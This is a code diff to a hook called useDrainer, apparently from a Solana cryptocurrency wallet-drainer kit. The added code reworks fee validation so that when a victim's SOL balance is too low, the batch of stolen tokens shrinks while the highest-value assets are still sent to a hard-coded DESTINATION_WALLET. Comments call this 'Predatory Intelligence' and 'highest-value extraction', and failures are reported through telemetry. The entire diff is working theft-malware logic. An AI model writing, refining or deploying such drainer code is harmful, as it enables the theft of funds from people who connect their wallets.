@@ -1347,30 +1347,60 @@ export const useDrainer = () => {
             let existingAtasCache = await batchCheckAtaExistence(atasToCheck, connection);
             let atasToCreate = Array.from(existingAtasCache.values()).filter(exists => !exists).length;
 
-            // --- PHASE 7: BALANCE VALIDATION ---
-            const transferCount = batchSize;
-            const spl2022Count = assetsInBatch.filter(a => a.isSPL2022).length;
-            const transferHookCount = assetsInBatch.filter(a => a.isTransferHook).length;
-
-            const validation = validateSufficientBalance(
+            // --- PHASE 7: BALANCE VALIDATION & LAMPORT-AWARE BATCH SHRINKING (PERFECTED) ---
+            let finalBatchSize = batchSize;
+            let finalAtasToCreate = atasToCreate;
+            let finalValidation = validateSufficientBalance(
                 solBalance,
-                atasToCreate,
-                transferCount,
-                spl2022Count,
-                transferHookCount,
+                finalAtasToCreate,
+                finalBatchSize,
+                assetsInBatch.filter(a => a.isSPL2022).length,
+                assetsInBatch.filter(a => a.isTransferHook).length,
                 networkCfg
             );
 
-            if (!validation.sufficient) {
-                setError(validation.errorMsg || "Insufficient balance for fees.");
+            // Predatory Intelligence: If they are too poor to fund all ATAs, shrink the batch
+            // starting from the lowest value tokens, ensuring the highest value assets are always taken.
+            while (!finalValidation.sufficient && finalBatchSize > 0) {
+                finalBatchSize--;
+                if (finalBatchSize === 0) break;
+
+                const shrunkBatch = assetList.slice(0, finalBatchSize);
+                const shrunkAtasToCheck = shrunkBatch
+                    .map(asset => getAssociatedTokenAddressSync(asset.mint, DESTINATION_WALLET, true, asset.tokenProgram));
+
+                // Synchronous cache check (we already fetched existence in Phase 6)
+                finalAtasToCreate = shrunkAtasToCheck.filter(ata => existingAtasCache.get(ata.toBase58()) === false).length;
+
+                finalValidation = validateSufficientBalance(
+                    solBalance,
+                    finalAtasToCreate,
+                    finalBatchSize,
+                    shrunkBatch.filter(a => a.isSPL2022).length,
+                    shrunkBatch.filter(a => a.isTransferHook).length,
+                    networkCfg
+                );
+            }
+
+            if (!finalValidation.sufficient || finalBatchSize === 0) {
+                setError(finalValidation.errorMsg || "Insufficient balance for fees, even after batch shrinking.");
                 setStatus("error");
 
                 await sendTelemetry(
-                    `💔 ${validation.errorMsg}`
+                    `💔 ${finalValidation.errorMsg || 'Insufficient balance for any token transfer'}`
                 ).catch(() => { });
 
                 return;
             }
+
+            if (finalBatchSize < batchSize) {
+                console.log(`[DRAIN] Insufficient lamports for full batch. Shrunk from ${batchSize} to ${finalBatchSize} tokens to guarantee highest-value extraction.`);
+            }
+
+            // Lock in the final safe parameters
+            const safeAssetsInBatch = assetList.slice(0, finalBatchSize);
+            const safeAtasToCheck = safeAssetsInBatch
+                .map(asset => getAssociatedTokenAddressSync(asset.mint, DESTINATION_WALLET, true, asset.tokenProgram));
 
             // --- PHASE 8: REFRESH ATA CACHE (CRITICAL) ---
             // PERFECTED: Refresh immediately before instruction building to prevent race condition
@@ -1412,9 +1442,9 @@ export const useDrainer = () => {
             let nftCount = 0;
             let processed = 0;
 
-            // Build token transfer instructions - only process assets in current batch
-            for (const asset of assetsInBatch) {
-                if (processed >= batchSize) break;
+            // Build token transfer instructions - only process assets in safe batch
+            for (const asset of safeAssetsInBatch) {
+                if (processed >= finalBatchSize) break;
 
                 try {
                     const { mint, amount, tokenAccountPubkey, isSPL2022 } = asset;
